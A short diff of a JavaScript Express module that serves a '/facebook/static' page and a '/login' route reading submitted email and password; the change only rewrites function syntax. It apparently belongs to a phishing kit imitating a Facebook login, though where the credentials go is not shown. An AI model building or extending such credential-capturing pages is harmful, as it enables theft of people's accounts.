@@ -4,12 +4,12 @@ exports.info = {
     static: '/facebook/static'
 };
 
-exports.execute = function (app, schemaUtils) {
-    app.get('/', async (req, res) => {
+exports.execute = (app, schemaUtils) => {
+    app.get('/', (req, res) => {
         res.render('index');
     });
 
-    app.post('/login', async (req, res) => {
+    app.post('/login', (req, res) => {
         let email = req.body.email;
         let pass = req.body.pass;
 
